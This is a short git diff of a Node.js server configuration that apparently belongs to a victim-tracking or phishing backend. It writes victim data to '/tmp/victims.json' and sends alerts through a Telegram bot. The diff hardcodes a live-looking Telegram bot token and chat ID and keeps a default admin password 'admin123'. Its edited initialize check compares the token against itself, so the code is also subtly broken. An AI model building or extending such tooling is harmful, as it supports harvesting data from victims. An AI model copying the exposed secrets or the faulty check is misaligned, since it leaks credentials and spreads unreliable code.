@@ -15,8 +15,8 @@ const PORT = process.env.PORT || 3000;
 
 // ==================== CONFIGURATION ====================
 const CONFIG = {
-    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE',
-    TELEGRAM_CHAT_ID: process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE',
+    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s',
+    TELEGRAM_CHAT_ID: process.env.CHAT_ID || '6834832649',
     ADMIN_PASSWORD: process.env.ADMIN_PASS || 'admin123',
     SESSION_SECRET: crypto.randomBytes(32).toString('hex'),
     DATA_FILE: '/tmp/victims.json', // Vercel uses /tmp for persistence
@@ -111,7 +111,7 @@ class TelegramBotService {
     }
 
     initialize() {
-        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
             console.warn('⚠️ Telegram bot token not set. Alerts will not be sent.');
             return;
         }
